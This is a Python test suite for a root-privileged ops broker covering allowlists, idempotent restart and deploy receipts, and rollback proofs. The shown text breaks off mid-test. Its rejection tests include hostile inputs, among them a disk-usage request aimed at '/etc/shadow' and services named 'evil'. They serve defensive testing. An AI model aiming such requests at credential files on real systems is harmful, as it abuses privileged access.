#!/usr/bin/env python3
"""Deterministic tests for the root-owned platform operations broker.

Tests cover:
  - Allowlist enforcement (service names, cache names, disk paths)
  - Read-only diagnostic operations (service-status, disk-usage, etc.)
  - Mutating operations with idempotent receipts (service-restart, cache-reclaim)
  - Journal hash chain integrity
  - Bounded output
  - Credential non-disclosure
  - Malformed request rejection
  - Idempotency: replay with same key returns same receipt
  - No generic shell/SSH/sudo/path injection
"""

from __future__ import annotations

import importlib.util
import json
import os
import socket
import sqlite3
import subprocess
import sys
import tempfile
import unittest
from contextlib import ExitStack, contextmanager
from pathlib import Path
from unittest.mock import patch, MagicMock

MODULE_PATH = Path(__file__).with_name("platform-ops-broker.py")
SPEC = importlib.util.spec_from_file_location("platform_ops_broker", MODULE_PATH)
assert SPEC and SPEC.loader
broker = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(broker)

VERIFY_MODULE_PATH = Path(__file__).with_name("verify-platform-ops-broker.py")
VERIFY_SPEC = importlib.util.spec_from_file_location("verify_platform_ops_broker", VERIFY_MODULE_PATH)
assert VERIFY_SPEC and VERIFY_SPEC.loader
verify_broker = importlib.util.module_from_spec(VERIFY_SPEC)
VERIFY_SPEC.loader.exec_module(verify_broker)

# Default test allowlist used by most tests
TEST_ALLOWLIST = {
    "schemaVersion": "gloops.platform-ops-allowlist.v2",
    "allowedServices": {
        "paperclip-gloops.service": {
            "healthUrl": "http://127.0.0.1:3100/api/health",
            "container": "paperclip-gloops",
            "imageEnv": "PAPERCLIP_IMAGE",
            "frontDoorHealth": {
                "publicUrl": "https://paperclip.gloops.ai/",
                "publicBodyContains": "<div id=\"root\"></div>",
                "apiHealthUrl": "https://paperclip.gloops.ai/api/health",
                "protectedUrl": "https://paperclip.gloops.ai/api/companies",
                "websocketUrl": (
                    "https://paperclip.gloops.ai/api/companies/"
                    "00000000-0000-0000-0000-000000000000/events/ws"
                ),
            },
            "rollbackProof": {
                "listenerPorts": [3100],
            },
        },
        "paperclip-hermes-execution.service": {
            "healthUrl": None,
            "container": "paperclip-hermes-execution",
            "imageEnv": "HERMES_EXECUTION_IMAGE",
        },
        "paperclip-hermes-handshake.service": {
            "healthUrl": None,
            "container": "paperclip-hermes-handshake",
            "imageEnv": "HERMES_HANDSHAKE_IMAGE",
        },
        "paperclip-github-push-broker.service": {
            "healthUrl": None,
            "container": None,
            "imageEnv": None,
        },
        "paperclip-github-read-broker.service": {
            "healthUrl": None,
            "container": None,
            "imageEnv": None,
        },
        "paperclip-campaign-deadman.service": {
            "healthUrl": None,
            "container": None,
            "imageEnv": None,
        },
    },
    "allowedCachePaths": {
        "hermes-cache": "/opt/paperclip/hermes-execution-state/cache",
        "hermes-logs": "/opt/paperclip/hermes-execution-state/logs",
        "docker-build-cache": "/var/lib/paperclip-gloops/build-cache",
    },
    "cacheThresholdPercent": 85,
    "maxReceiptAgeDays": 30,
}


class PlatformOpsBrokerTests(unittest.TestCase):
    """Tests for the platform-operations broker."""

    def setUp(self):
        self.tempdir = tempfile.TemporaryDirectory()
        self.dir = Path(self.tempdir.name)
        self.runtime = self.dir / "run"
        self.state = self.dir / "state"
        self.config = self.dir / "config"
        self.config.mkdir(parents=True)
        self.socket_path = self.runtime / "broker.sock"
        self.lock_path = self.state / "command.lock"
        self.db_path = self.state / "broker.sqlite3"
        self.allowlist_path = self.config / "platform-ops-allowlist.json"
        self.allowlist_path.write_text(json.dumps(TEST_ALLOWLIST))
        # Create config/runtime.env so deploy-pinned-image tests can read it
        (self.config / "runtime.env").write_text(
            "PAPERCLIP_IMAGE=ghcr.io/gloopsai/paperclip-gloops@sha256:"
            + "1" * 64
            + "\n"
        )
        (self.config / "approved-image").write_text(
            "ghcr.io/gloopsai/paperclip-gloops@sha256:" + "1" * 64 + "\n"
        )
        # Preload allowlist before the cache Path.exists mock in cache-inspect tests
        broker._allowlist_cache = None
        with self.paths():
            broker.load_allowlist()
        deploy_end_to_end_tests = {
            "test_socket_deploy_end_to_end_restoration_proof",
            "test_socket_deploy_end_to_end_rejects_live_identity_drift",
            "test_socket_deploy_exceptions_after_every_mutation_boundary_compensate",
        }
        uses_deploy = "deploy" in self._testMethodName or self._testMethodName in {
            "test_socket_unproved_compensation_is_durable_reconciliation_required",
            "test_socket_rollback_proof_exception_requires_reconciliation",
        }
        if uses_deploy and self._testMethodName not in deploy_end_to_end_tests:
            if self._testMethodName != "test_deploy_rejects_unbound_source_commit_before_pin_mutation":
                source_binding_patcher = patch.object(
                    broker,
                    "_image_source_binding_evidence",
                    return_value={
                        "sourceCommit": "d" * 40,
                        "artifactDigest": "sha256:" + "a" * 64,
                        "expectedImage": "ghcr.io/gloopsai/paperclip-gloops@sha256:" + "a" * 64,
                        "proofComplete": True,
                    },
                )
                source_binding_patcher.start()
                self.addCleanup(source_binding_patcher.stop)
            prior_release = self.release_proof()
            prior_patcher = patch.object(
                broker, "_capture_prior_release_state", return_value=prior_release,
            )
            prior_patcher.start()
            self.addCleanup(prior_patcher.stop)
            if self._testMethodName != "test_socket_rollback_proof_exception_requires_reconciliation":
                rollback_patcher = patch.object(
                    broker, "_safe_rollback_terminal_evidence", return_value=prior_release,
                )
                rollback_patcher.start()
                self.addCleanup(rollback_patcher.stop)

    def tearDown(self):
        broker._allowlist_cache = None
        self.tempdir.cleanup()

    def paths(self):
        return patch.multiple(
            broker,
            RUNTIME_DIR=self.runtime,
            STATE_DIR=self.state,
            SOCKET_PATH=self.socket_path,
            COMMAND_LOCK=self.lock_path,
            CONFIG_DIR=self.config,
            ALLOWLIST_PATH=self.allowlist_path,
            DATABASE=self.db_path,
            TEST_MODE=True,
        )

    def socket_request(self, request, connection):
        """Exercise the production transaction boundary over a real socket."""
        client, server = socket.socketpair()
        with client, server:
            client.sendall(json.dumps(request).encode("utf-8") + b"\n")
            broker.handle_connection(server, connection)
            return json.loads(client.recv(broker.MAX_RESPONSE_BYTES).decode("utf-8"))

    def release_proof(self, image=None, *, proof_complete=True):
        image = image or (self.config / "approved-image").read_text().strip()
        image_id = "sha256:" + "d" * 64
        evidence = {
            "schemaVersion": "gloops.rollback-proof.v1",
            "service": "paperclip-gloops.service",
            "mode": "restored",
            "serviceState": {"active": True, "state": "active"},
            "listeners": {
                "inspectable": True,
                "configuredPorts": [3100],
                "presentPorts": [3100],
                "error": "",
            },
            "containerArtifact": {
                "inspectable": True,
                "exists": True,
                "running": True,
                "configuredImage": image,
                "imageId": image_id,
                "error": "",
            },
            "expectedPriorImage": image,
            "imageBinding": {
                "configuredReferenceMatches": True,
                "immutableImageIdMatches": True,
                "expectedDigestPresent": True,
                "container": {
                    "inspectable": True,
                    "exists": True,
                    "running": True,
                    "configuredImage": image,
                    "imageId": image_id,
                    "error": "",
                },
                "expectedImage": {
                    "inspectable": True,
                    "reference": image,
                    "imageId": image_id,
                    "repoDigests": [image],
                    "error": "",
                },
                "proofComplete": proof_complete,
            },
            "frontDoorHealth": {
                "service": "paperclip-gloops.service",
                "healthy": proof_complete,
                "systemctl": {"active": proof_complete, "state": "active"},
                "probes": [],
            },
            "proofComplete": proof_complete,
        }
        evidence["releaseIdentity"] = broker._release_identity(evidence)
        return evidence

    @contextmanager
    def mocked_prior_release(self, *, safe_rollback=True):
        evidence = self.release_proof()
        with ExitStack() as stack:
            stack.enter_context(patch.object(
                broker, "_capture_prior_release_state", return_value=evidence,
            ))
            if safe_rollback:
                stack.enter_context(patch.object(
                    broker, "_safe_rollback_terminal_evidence", return_value=evidence,
                ))
            yield evidence

    def real_release_command(self, state, *, restart_failure=None):
        """Network-free command boundary for real release capture/proof code."""
        prior_id = "sha256:" + "c" * 64
        candidate_id = "sha256:" + "a" * 64

        def command(args, timeout=broker.COMMAND_TIMEOUT_SECONDS, env=None):
            state["calls"].append(args)
            if args[:2] == ["systemctl", "is-active"]:
                return 0, "active\n", ""
            if args[:2] == ["systemctl", "restart"]:
                state["restartCount"] += 1
                approved = (self.config / "approved-image").read_text().strip()
                if approved.endswith("a" * 64) and not state.get("candidateRestartFailed"):
                    state["candidateRestartFailed"] = True
                    if restart_failure == "timeout":
                        raise broker.BrokerError("command timed out")
                    if restart_failure == "missing":
                        raise broker.BrokerError("required command is not available")
                return 0, "", ""
            if args[0] == "ss":
                return 0, "LISTEN 0 4096 127.0.0.1:3100 0.0.0.0:*\n", ""
            if args[:3] == ["docker", "container", "inspect"]:
                bound = (self.config / "approved-image").read_text().strip()
                image_id = candidate_id if bound.endswith("a" * 64) else prior_id
                return 0, f"true\t{bound}\t{image_id}\n", ""
            if args[:3] == ["docker", "image", "inspect"]:
                reference = args[-1]
                image_id = candidate_id if reference.endswith("a" * 64) else prior_id
                return 0, f'{image_id}\t["{reference}"]\t{"d" * 40}\n', ""
            if args[:2] == ["docker", "pull"]:
                return 0, "", ""
            if args[0] == "curl":
                url = args[-1]
                if "events/ws" in url:
                    body, status, content_type = "", 401, "application/json"
                elif url.endswith("/api/health"):
                    body, status, content_type = '{"status":"ok"}', 200, "application/json"
                elif url.endswith("/api/companies"):
                    body, status, content_type = "{}", 401, "application/json"
                else:
                    body, status, content_type = '<div id="root"></div>', 200, "text/html"
                return 0, f"{body}\n{broker.HTTP_PROBE_MARKER}{status}\t{content_type}", ""
            raise AssertionError(f"unexpected command: {args}")

        return command

    # -------------------------------------------------------------------------
    # Allowlist enforcement
    # -------------------------------------------------------------------------

    def test_database_migrates_existing_receipts_to_action_digest(self):
        self.state.mkdir(parents=True, exist_ok=True)
        legacy = sqlite3.connect(self.db_path)
        legacy.execute(
            """
            CREATE TABLE receipts (
              receipt_id TEXT PRIMARY KEY,
              operation TEXT NOT NULL,
              target TEXT NOT NULL,
              idempotency_key TEXT NOT NULL UNIQUE,
              state TEXT NOT NULL,
              actor TEXT NOT NULL,
              command_class TEXT NOT NULL,
              evidence_json TEXT NOT NULL,
              outcome TEXT NOT NULL,
              created_at TEXT NOT NULL,
              updated_at TEXT NOT NULL
            )
            """
        )
        legacy.execute(
            """
            INSERT INTO receipts
              (receipt_id, operation, target, idempotency_key, state, actor,
               command_class, evidence_json, outcome, created_at, updated_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """,
            (
                "legacy-receipt-001",
                "service-restart",
                "paperclip-gloops.service",
                "legacy-restart-key-001",
                "completed",
                "wren-agent",
                "restart_named_service",
                "{}",
                "success",
                "2026-08-13T00:00:00Z",
                "2026-08-13T00:00:01Z",
            ),
        )
        legacy.commit()
        legacy.close()
        with self.paths():
            migrated = broker.connect_database()
        columns = {
            row["name"] for row in migrated.execute("PRAGMA table_info(receipts)")
        }
        self.assertIn("action_digest", columns)
        with self.paths(), patch.object(broker, "run_command") as effects:
            rejected = self.socket_request({
                "operation": "service-restart",
                "service": "paperclip-gloops.service",
                "actor": "wren-agent",
                "idempotencyKey": "legacy-restart-key-001",
            }, migrated)
        self.assertFalse(rejected["ok"])
        self.assertIn("legacy unbound receipt", rejected["error"])
        effects.assert_not_called()
        receipt = broker.list_receipts(migrated)[0]
        self.assertEqual(receipt["receiptId"], "legacy-receipt-001")
        self.assertEqual(receipt["state"], "completed")
        self.assertIsNone(receipt["actionDigest"])
        migrated.close()

    def test_rejects_non_allowlisted_service_for_status(self):
        with self.paths():
            with self.assertRaisesRegex(broker.BrokerError, "not in the allowlist"):
                broker.process_request({
                    "operation": "service-status",
                    "service": "evil.service",
                })

    def test_rejects_malformed_service_name(self):
        with self.paths():
            with self.assertRaisesRegex(broker.BrokerError, "systemd unit name"):
                broker.process_request({
                    "operation": "service-status",
                    "service": "not-a-service",
                })

    def test_rejects_non_allowlisted_cache(self):
        with self.paths():
            with self.assertRaisesRegex(broker.BrokerError, "not in the allowlist"):
                broker.process_request({
                    "operation": "cache-inspect",
                    "cache": "evil-cache",
                })

    def test_rejects_disk_usage_for_arbitrary_path(self):
        with self.paths():
            with self.assertRaisesRegex(broker.BrokerError, "not allowed for disk usage"):
                broker.process_request({
                    "operation": "disk-usage",
                    "path": "/etc/shadow",
                })

    def test_rejects_disk_usage_for_relative_path(self):
        with self.paths():
            with self.assertRaisesRegex(broker.BrokerError, "absolute path"):
                broker.process_request({
                    "operation": "disk-usage",
                    "path": "relative/path",
                })

    def test_accepts_allowlisted_service_for_status(self):
        with self.paths():
            mock_result = (0, "ActiveState=active\nSubState=running\nLoadState=loaded\nResult=success\n", "")
            with patch.object(broker, "run_command", return_value=mock_result):
                result = broker.process_request({
                    "operation": "service-status",
                    "service": "paperclip-gloops.service",
                })
        self.assertTrue(result["ok"])
        self.assertEqual(result["data"]["activeState"], "active")

    def test_allowlist_verifier_accepts_complete_front_door_and_rollback_profiles(self):
        self.assertEqual(verify_broker.verify_allowlist(self.config), [])

    def test_allowlist_verifier_fails_closed_on_incomplete_front_door_profile(self):
        allowlist = json.loads(self.allowlist_path.read_text())
        del allowlist["allowedServices"]["paperclip-gloops.service"]["frontDoorHealth"][
            "websocketUrl"
        ]
        self.allowlist_path.write_text(json.dumps(allowlist))
        errors = verify_broker.verify_allowlist(self.config)
        self.assertTrue(any("websocketUrl" in error for error in errors), errors)

    # -------------------------------------------------------------------------
    # Read-only diagnostic operations
    # -------------------------------------------------------------------------

    def test_service_status_calls_systemctl_correctly(self):
        captured_args = []
        def mock_run(args, timeout=120, env=None):
            captured_args.append(args)
            return (0, "ActiveState=active\nSubState=running\nLoadState=loaded\nResult=success\n", "")
        with self.paths():
            with patch.object(broker, "run_command", side_effect=mock_run):
                result = broker.process_request({
                    "operation": "service-status",
                    "service": "paperclip-gloops.service",
                })
        self.assertTrue(result["ok"])
        self.assertEqual(captured_args[0][0], "systemctl")
        self.assertEqual(captured_args[0][1], "show")
        self.assertIn("paperclip-gloops.service", captured_args[0])

    def test_service_health_with_http_url(self):
        allowlist = json.loads(self.allowlist_path.read_text())
        with self.paths():
            mock_results = [
                (0, "active\n", ""),  # systemctl is-active
                (0, "200\n", ""),     # curl
            ]
            with patch.object(broker, "run_command", side_effect=mock_results):
                result = broker.process_request({
                    "operation": "service-health",
                    "service": "paperclip-gloops.service",
                })
        self.assertTrue(result["ok"])
        self.assertTrue(result["data"]["healthy"])
        self.assertEqual(result["data"]["httpStatus"], "200")

    def test_service_health_without_http_url(self):
        with self.paths():
            with patch.object(broker, "run_command", return_value=(0, "active\n", "")):
                result = broker.process_request({
                    "operation": "service-health",
                    "service": "paperclip-github-push-broker.service",
                })
        self.assertTrue(result["ok"])
        self.assertTrue(result["data"]["healthy"])
        self.assertNotIn("httpStatus", result["data"])

    def test_front_door_health_requires_the_full_route_matrix(self):
        with self.paths():
            mock_results = [
                (0, "active\n", ""),
                (0, '<!doctype html><div id="root"></div>\n__PAPERCLIP_HTTP_PROBE__200\ttext/html; charset=utf-8', ""),
                (0, '{"status":"ok"}\n__PAPERCLIP_HTTP_PROBE__200\tapplication/json', ""),
                (0, '{"error":"board access required"}\n__PAPERCLIP_HTTP_PROBE__403\tapplication/json', ""),
                (0, "\n__PAPERCLIP_HTTP_PROBE__403\ttext/plain", ""),
            ]
            with patch.object(broker, "run_command", side_effect=mock_results) as run:
                broker.process_request({
                    "operation": "front-door-health",
                    "service": "paperclip-gloops.service",
                })
        commands = [call.args[0] for call in run.call_args_list]
        self.assertTrue(any("https://paperclip.gloops.ai/" in command for command in commands))
        self.assertTrue(any("/api/health" in " ".join(command) for command in commands))
        self.assertTrue(any("/api/companies" in " ".join(command) for command in commands))
        self.assertTrue(any("Upgrade: websocket" in command for command in commands))

    def test_front_door_health_rejects_a_vacuous_api_200(self):
        with self.paths():
            mock_results = [
                (0, "active\n", ""),
                (0, '<!doctype html><div id="root"></div>\n__PAPERCLIP_HTTP_PROBE__200\ttext/html', ""),
                (0, '<!doctype html>\n__PAPERCLIP_HTTP_PROBE__200\ttext/html', ""),
                (0, '{}\n__PAPERCLIP_HTTP_PROBE__403\tapplication/json', ""),
                (0, "\n__PAPERCLIP_HTTP_PROBE__403\ttext/plain", ""),
            ]
            with patch.object(broker, "run_command", side_effect=mock_results):
                result = broker.process_request({
                    "operation": "front-door-health",
                    "service": "paperclip-gloops.service",
                })
        self.assertFalse(result["data"]["healthy"])
        api_probe = next(
            probe for probe in result["data"]["probes"]
            if probe["name"] == "api-health"
        )
        self.assertFalse(api_probe["passed"])
        self.assertIsNone(api_probe["jsonStatus"])

    def test_websocket_probe_accepts_upgrade_before_bounded_disconnect(self):
        with self.paths():
            with patch.object(
                broker,
                "run_command",
                return_value=(
                    28,
                    "\n__PAPERCLIP_HTTP_PROBE__101\t",
                    "curl: (28) bounded websocket probe elapsed",
                ),
            ):
                result = broker._websocket_probe(
                    TEST_ALLOWLIST["allowedServices"]["paperclip-gloops.service"]
                    ["frontDoorHealth"]["websocketUrl"]
                )
        self.assertTrue(result["passed"])
        self.assertTrue(result["transportSucceeded"])

    def test_disk_usage_calls_df_correctly(self):
        with self.paths():
            with patch.object(broker, "run_command", return_value=(0, "Size Used Avail Use%\n10G 5G 5G 50%\n", "")):
                result = broker.process_request({
                    "operation": "disk-usage",
                    "path": "/",
                })
        self.assertTrue(result["ok"])
        self.assertEqual(result["data"]["path"], "/")
        self.assertEqual(result["data"]["usePercent"], "50%")

    def test_memory_usage_calls_free_correctly(self):
        with self.paths():
            with patch.object(broker, "run_command", return_value=(0, "              total        used        free      shared  buff/cache   available\nMem:           1000         500         200          50          300         400\n", "")):
                result = broker.process_request({
                    "operation": "memory-usage",
                })
        self.assertTrue(result["ok"])
        self.assertEqual(result["data"]["totalMb"], "1000")

    def test_cpu_usage_calls_uptime(self):
        with self.paths():
            with patch.object(broker, "run_command", return_value=(0, "load average: 0.5, 0.4, 0.3\n", "")):
                result = broker.process_request({
                    "operation": "cpu-usage",
                })
        self.assertTrue(result["ok"])
        self.assertIn("load average", result["data"]["uptime"])

    def test_cache_inspect_for_nonexistent_path(self):
        with self.paths():
            with patch.object(broker, "run_command", return_value=(0, "0\t/opt/paperclip/hermes-execution-state/cache\n", "")):
                # Make the path not exist
                with patch.object(Path, "exists", return_value=False):
                    result = broker.process_request({
                        "operation": "cache-inspect",
                        "cache": "hermes-cache",
                    })
        self.assertTrue(result["ok"])
        self.assertFalse(result["data"]["exists"])
        self.assertEqual(result["data"]["sizeBytes"], 0)

    def test_cache_inspect_for_existing_path(self):
        with self.paths():
            with patch.object(broker, "run_command", return_value=(0, "12345\t/opt/paperclip/hermes-execution-state/cache\n", "")):
                with patch.object(Path, "exists", return_value=True):
                    result = broker.process_request({
                        "operation": "cache-inspect",
                        "cache": "hermes-cache",
                    })
        self.assertTrue(result["ok"])
        self.assertTrue(result["data"]["exists"])
        self.assertEqual(result["data"]["sizeBytes"], 12345)

    # -------------------------------------------------------------------------
    # Mutating operations with idempotent receipts
    # -------------------------------------------------------------------------

    def test_service_restart_creates_receipt_and_completes(self):
        with self.paths():
            connection = broker.connect_database()
            mock_results = [
                (0, "active\n", ""),  # pre-health check
                (0, "", ""),          # systemctl restart
                (0, "active\n", ""),  # post-health check
            ]
            with patch.object(broker, "run_command", side_effect=mock_results):
                result = broker.process_request({
                    "operation": "service-restart",
                    "service": "paperclip-gloops.service",
                    "actor": "wren-agent",
                    "idempotencyKey": "restart-001",
                }, connection=connection)
        self.assertTrue(result["ok"])
        self.assertEqual(result["data"]["state"], "completed")
        self.assertIn("receiptId", result["data"])
        self.assertTrue(result["data"]["evidence"]["preHealth"]["active"])
        self.assertTrue(result["data"]["evidence"]["postHealth"]["active"])
        connection.close()

    def test_service_restart_is_idempotent_with_same_key(self):
        with self.paths():
            connection = broker.connect_database()
            mock_results = [
                (0, "active\n", ""),  # pre-health
                (0, "", ""),          # restart
                (0, "active\n", ""),  # post-health
            ]
            with patch.object(broker, "run_command", side_effect=mock_results):
                result1 = broker.process_request({
                    "operation": "service-restart",
                    "service": "paperclip-gloops.service",
                    "actor": "wren-agent",
                    "idempotencyKey": "restart-002",
                }, connection=connection)

            # Second request with same idempotency key should be a replay
            with patch.object(broker, "run_command", side_effect=[]):
                result2 = broker.process_request({
                    "operation": "service-restart",
                    "service": "paperclip-gloops.service",
                    "actor": "wren-agent",
                    "idempotencyKey": "restart-002",
                }, connection=connection)
        self.assertTrue(result1["ok"])
        self.assertTrue(result2["ok"])
        self.assertEqual(result1["data"]["receiptId"], result2["data"]["receiptId"])
        self.assertTrue(result2["data"]["replayed"])
        connection.close()

    def test_service_restart_rejects_missing_actor(self):
        with self.paths():
            connection = broker.connect_database()
            with self.assertRaisesRegex(broker.BrokerError, "actor is required"):
                broker.process_request({
                    "operation": "service-restart",
                    "service": "paperclip-gloops.service",
                    "idempotencyKey": "restart-003",
                }, connection=connection)
            connection.close()

    def test_service_restart_rejects_missing_idempotency_key(self):
        with self.paths():
            connection = broker.connect_database()
            with self.assertRaisesRegex(broker.BrokerError, "idempotencyKey is required"):
                broker.process_request({
                    "operation": "service-restart",
                    "service": "paperclip-gloops.service",
                    "actor": "wren-agent",
                }, connection=connection)
            connection.close()

    def test_service_restart_rejects_non_allowlisted_service(self):
        with self.paths():
            connection = broker.connect_database()
            with self.assertRaisesRegex(broker.BrokerError, "not in the allowlist"):
                broker.process_request({
                    "operation": "service-restart",
                    "service": "evil.service",
                    "actor": "wren-agent",
                    "idempotencyKey": "restart-004",
                }, connection=connection)
            connection.close()

    def test_cache_reclaim_creates_receipt(self):
        with self.paths():
            connection = broker.connect_database()
            cache_path = Path("/opt/paperclip/hermes-execution-state/cache")
            mock_results = [
                (0, "5000\t/opt/paperclip/hermes-execution-state/cache\n", ""),  # pre du
                (0, "", ""),  # find -delete
                (0, "0\t/opt/paperclip/hermes-execution-state/cache\n", ""),     # post du
            ]
            with patch.object(broker, "run_command", side_effect=mock_results):
                with patch.object(Path, "exists", return_value=True):
                    result = broker.process_request({
                        "operation": "cache-reclaim",
                        "cache": "hermes-cache",
                        "actor": "wren-agent",
                        "idempotencyKey": "reclaim-001",
                    }, connection=connection)
        self.assertTrue(result["ok"])
        self.assertEqual(result["data"]["state"], "completed")
        self.assertEqual(result["data"]["evidence"]["preSizeBytes"], 5000)
        self.assertEqual(result["data"]["evidence"]["postSizeBytes"], 0)
        self.assertEqual(result["data"]["evidence"]["reclaimedBytes"], 5000)
        connection.close()

    def test_deploy_pinned_image_rejects_unpinned_image(self):
        with self.paths():
            connection = broker.connect_database()
            with self.assertRaisesRegex(broker.BrokerError, "pinned digest"):
                broker.process_request({
                    "operation": "deploy-pinned-image",
                    "service": "paperclip-gloops.service",
                    "image": "myimage:latest",
                    "sourceCommit": "d" * 40,
                    "actor": "wren-agent",
                    "idempotencyKey": "deploy-001",
                }, connection=connection)
            connection.close()

    def test_deploy_pinned_image_accepts_sha256_digest(self):
        with self.paths():
            connection = broker.connect_database()
            image = "ghcr.io/gloopsai/paperclip-gloops@sha256:" + "a" * 64
            mock_results = [
                (0, "", ""),  # docker pull
                (0, "", ""),  # systemctl restart
                (0, "active\n", ""),  # post-health
            ]
            with patch.object(broker, "run_command", side_effect=mock_results):
                with patch.object(
                    broker, "_front_door_health",
                    return_value={"healthy": True, "probes": []},
                ):
                    with patch.object(
                        broker, "_image_binding_evidence",
                        return_value={
                            "proofComplete": True,
                            "immutableImageIdMatches": True,
                        },
                    ):
                        result = broker.process_request({
                            "operation": "deploy-pinned-image",
                            "service": "paperclip-gloops.service",
                            "image": image,
                            "sourceCommit": "d" * 40,
                            "actor": "wren-agent",
                            "idempotencyKey": "deploy-002",
                        }, connection=connection)
        self.assertTrue(result["ok"])
        self.assertEqual(result["data"]["state"], "completed")
        self.assertEqual(
            (self.config / "runtime.env").read_text(),
            f"PAPERCLIP_IMAGE={image}\n",
        )
        self.assertEqual((self.config / "approved-image").read_text(), image + "\n")
        self.assertTrue(result["data"]["evidence"]["comprehensiveHealthPassed"])
        connection.close()

    def test_deploy_rejects_unbound_source_commit_before_pin_mutation(self):
        with self.paths():
            connection = broker.connect_database()
            image = "ghcr.io/gloopsai/paperclip-gloops@sha256:" + "a" * 64
            previous_env = (self.config / "runtime.env").read_text()
            previous_pin = (self.config / "approved-image").read_text()
            with patch.object(broker, "run_command", side_effect=[
                (0, "", ""),
                (0, f'sha256:{"a" * 64}\t["{image}"]\t\n', ""),
            ]) as commands:
                with self.assertRaisesRegex(
                    broker.BrokerError,
                    "does not bind an exact source commit",
                ):
                    broker.process_request({
                        "operation": "deploy-pinned-image",
                        "service": "paperclip-gloops.service",
                        "image": image,
                        "sourceCommit": "d" * 40,
                        "actor": "wren-agent",
                        "idempotencyKey": "deploy-unbound-source-001",
                    }, connection=connection)
            self.assertEqual((self.config / "runtime.env").read_text(), previous_env)
            self.assertEqual((self.config / "approved-image").read_text(), previous_pin)
            self.assertFalse(any(call.args[0][:2] == ["systemctl", "restart"] for call in commands.call_args_list))
            receipt = broker.list_receipts(connection)[0]
            self.assertEqual(receipt["state"], "failed")
            self.assertFalse(receipt["evidence"]["candidateSourceBinding"]["proofComplete"])
            connection.close()

    def test_image_source_binding_requires_the_expected_commit_and_digest(self):
        image = "ghcr.io/gloopsai/paperclip-gloops@sha256:" + "a" * 64
        with patch.object(broker, "run_command", return_value=(
            0,
            f'sha256:{"b" * 64}\t["{image}"]\t{"c" * 40}\n',
            "",
        )):
            mismatched = broker._image_source_binding_evidence(image, "d" * 40)
            matched = broker._image_source_binding_evidence(image, "c" * 40)
        self.assertFalse(mismatched["proofComplete"])
        self.assertEqual(mismatched["expectedSourceCommit"], "d" * 40)
        self.assertTrue(matched["proofComplete"])
        self.assertEqual(matched["artifactDigest"], "sha256:" + "a" * 64)

    def test_socket_deploy_same_key_payload_drift_has_zero_effects(self):
        with self.paths():
            first_image = "ghcr.io/gloopsai/paperclip-gloops@sha256:" + "a" * 64
            second_image = "ghcr.io/gloopsai/paperclip-gloops@sha256:" + "b" * 64
            first = {
                "operation": "deploy-pinned-image",
                "service": "paperclip-gloops.service",
                "image": first_image,
                "sourceCommit": "d" * 40,
                "actor": "wren-agent",
                "idempotencyKey": "deploy-payload-drift-001",
            }
            drifted = {**first, "image": second_image}
            connection = broker.connect_database()
            with patch.object(broker, "run_command", side_effect=[
                (0, "", ""),
                (0, "", ""),
                (0, "active\n", ""),
            ]), patch.object(
                broker, "_front_door_health", return_value={"healthy": True, "probes": []},
            ), patch.object(
                broker,
                "_image_binding_evidence",
                return_value={"proofComplete": True, "immutableImageIdMatches": True},
            ):
                successful = self.socket_request(first, connection)
            self.assertTrue(successful["ok"])

            with patch.object(broker, "run_command") as effects:
                rejected = self.socket_request(drifted, connection)
            self.assertFalse(rejected["ok"])
            self.assertIn("different action", rejected["error"])
            effects.assert_not_called()
            receipt = broker.list_receipts(connection)[0]
            self.assertEqual(receipt["state"], "completed")
            connection.close()

    def test_socket_deploy_concurrent_same_key_executes_once(self):
        import threading

        with self.paths():
            image = "ghcr.io/gloopsai/paperclip-gloops@sha256:" + "a" * 64
            request = {
                "operation": "deploy-pinned-image",
                "service": "paperclip-gloops.service",
                "image": image,
                "sourceCommit": "d" * 40,
                "actor": "wren-agent",
                "idempotencyKey": "deploy-concurrent-001",
            }
            second_connection = broker.connect_database()
            entered = threading.Event()
            release = threading.Event()
            command_calls: list[list[str]] = []

            def command(args, timeout=broker.COMMAND_TIMEOUT_SECONDS, env=None):
                command_calls.append(args)
                if args[:2] == ["docker", "pull"]:
                    entered.set()
                    self.assertTrue(release.wait(5))
                if args[:2] == ["systemctl", "is-active"]:
                    return 0, "active\n", ""
                return 0, "", ""

            responses: list[dict[str, object]] = []
            errors: list[BaseException] = []

            def first_request():
                first_connection = broker.connect_database()
                try:
                    responses.append(self.socket_request(request, first_connection))
                except BaseException as error:
                    errors.append(error)
                finally:
                    first_connection.close()

            with patch.object(broker, "run_command", side_effect=command), patch.object(
                broker, "_front_door_health", return_value={"healthy": True, "probes": []},
            ), patch.object(
                broker,
                "_image_binding_evidence",
                return_value={"proofComplete": True, "immutableImageIdMatches": True},
            ):
                thread = threading.Thread(target=first_request)
                thread.start()
                self.assertTrue(entered.wait(5))
                replay = self.socket_request(request, second_connection)
                release.set()
                thread.join(5)

            self.assertFalse(errors)
            self.assertEqual(len(responses), 1)
            self.assertTrue(responses[0]["ok"])
            self.assertTrue(replay["ok"])
            self.assertTrue(replay["data"]["replayed"])
            self.assertEqual(replay["data"]["state"], "initiated")
            self.assertEqual(sum(call[:2] == ["docker", "pull"] for call in command_calls), 1)
            self.assertEqual(sum(call[:2] == ["systemctl", "restart"] for call in command_calls), 1)
            second_connection.close()

    def test_socket_deploy_end_to_end_restoration_proof(self):
        self._assert_end_to_end_restoration_identity(drift_after_restart=False)

    def test_socket_deploy_end_to_end_rejects_live_identity_drift(self):
        self._assert_end_to_end_restoration_identity(drift_after_restart=True)

    def _assert_end_to_end_restoration_identity(self, *, drift_after_restart):
        with self.paths():
            image = "ghcr.io/gloopsai/paperclip-gloops@sha256:" + "a" * 64
            request = {
                "operation": "deploy-pinned-image",
                "service": "paperclip-gloops.service",
                "image": image,
                "sourceCommit": "d" * 40,
                "actor": "wren-agent",
                "idempotencyKey": f"deploy-e2e-proof-{drift_after_restart}",
            }
            runtime_path = self.config / "runtime.env"
            approved_path = self.config / "approved-image"
            os.chmod(runtime_path, 0o640)
            os.chmod(approved_path, 0o644)
            before = {
                path.name: (path.read_bytes(), path.stat().st_uid, path.stat().st_gid, path.stat().st_mode & 0o777)
                for path in (runtime_path, approved_path)
            }
            restart_count = 0
            prior_id = "sha256:" + "c" * 64
            drift_id = "sha256:" + "e" * 64

            def command(args, timeout=broker.COMMAND_TIMEOUT_SECONDS, env=None):
                nonlocal restart_count
                if args[:2] == ["systemctl", "is-active"]:
                    return 0, "active\n", ""
                if args[:2] == ["systemctl", "restart"]:
                    restart_count += 1
                    return 0, "", ""
                if args[0] == "ss":
